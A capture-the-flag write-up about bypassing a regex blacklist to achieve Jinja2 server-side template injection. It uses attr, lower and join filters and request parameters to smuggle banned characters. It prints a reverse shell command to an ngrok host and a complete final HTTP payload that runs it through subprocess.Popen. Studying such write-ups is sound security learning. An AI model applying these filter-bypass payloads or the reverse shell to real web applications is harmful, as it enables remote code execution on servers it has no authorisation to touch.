---
description: Jinja2 SSTI filter bypass
---

# Strong

> This type of challenges is created to be solved at the end, but you know it's a matter of time so who is the faster?
>
> Link: http://128.199.3.34:1234
>
> **Author:** Kahla

This was a Jinja2 template injection challenge, with the following filter:

```python
re.search("\{\{|\}\}|(popen)|(os)|(subprocess)|(application)|(getitem)|(flag.txt)|\.|_|\[|\]|\"|(class)|(subclasses)|(mro)|\\\\",request.form['name'])
```

As we can see, the filter is quite extensive!

![](<../../.gitbook/assets/Screenshot 2022-05-13 at 6.06.52 PM.png>)

### Bypassing "\{{" and "\}}"

This one is rather straightforward. We could still get code execution through an if-else statement:

```django
{% raw %}
{% if PAYLOAD %}{% endif %}
{% endraw %}
```

### Bypassing ".", "\[", "]"

We could bypass the use of `.` by using the `attr` filter. For instance, `request|attr('args')` is the same as `request.args`.

Sometimes, we need to access elements of a list or dictionary. This was a bit more tricky but looking into the [Built-in Filters](https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters) part of the documentation, we can find some useful information.

To get the first and last items of a list, we could use `|first` and `|last` respectively.

If we need to access items in a dictionary, we could first convert them to a list using `|list`, then access the first and last elements.

### Bypassing "\_", "\\", "class", "subclasses", "getitem"

In order for our RCE payload to work, I needed access to `__class__`, `__subclassess__` and `__getitem__`.

We needed a way to construct something like `()|attr('__class__')`. The `\` character was banned, so using octal or hexadecimal numbers to construct the string was not possible.

One easy way to get banned characters into a string was to use `request.args` - this is a MultiDict object containing the GET request parameters.

For example, this allowed us to get the `__` string:

```http
POST /?__=a

...

name=... request|attr('args')|list|first ...
```

Bypassing the `class`, `subclasses`, and `getitem` strings could be done by using the `|lower` filter. For instance: `'CLASS'|lower`.

All that's left to do is to join the `class` string with the preceding and ending `__` characters. This can be achieved using `|join`.

Viola, the following will give us `().__class__`:

`()|attr((request|attr('args')|list|first,'CLASS'|lower,request|attr('args')|list|first)|join)`

This can then be extended to construct almost any arbitrary payload.

### Gaining RCE

To get RCE, a typical method is through `().__class__.__subclasses__.__getitem__(x)` where `x` corresponds to the index of the `subprocess.Popen` class.

We do not know the value of `x` in this case, but we can still blindly bruteforce the value of `x` by submitting our RCE payload with different `x` values until we receive a shell.

In order to complete our RCE payload, I needed the `.` character for my callback domain, and the `"` character for the bash command:

`bash -c "bash -i >& /dev/tcp/8.tcp.ngrok.io/14003 0>&1"`

These characters can be obtained in a similar fashion as `__`. Adding a second GET request parameter, we can access `.` through `request|attr('args')|list|last`.

As for `"`, we could add another POST request parameter and access it through `request|attr('form')|list|last)|join`.

### Final Payload

It might not have been the most elegant, but it got the job done!

```http
POST /?__=a&.=b HTTP/1.1
Host: 128.199.3.34:1234
Content-Length: 661

name={% raw %}
{% if ()|attr((request|attr('args')|list|first,'CLASS'|lower,request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'base',request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'SUBCLASSES'|lower,request|attr('args')|list|first)|join)()|attr((request|attr('args')|list|first,'GETITEM'|lower,request|attr('args')|list|first)|join)(276)(('bash -c ',request|attr('form')|list|last,'bash -i >%26 /dev/tcp/8',request|attr('args')|list|last,'tcp',request|attr('args')|list|last,'ngrok',request|attr('args')|list|last,'io/14003 0>%261',request|attr('form')|list|last)|join,shell=True,stdout=-1) %}{% endif %}
{% endraw %}&"
```
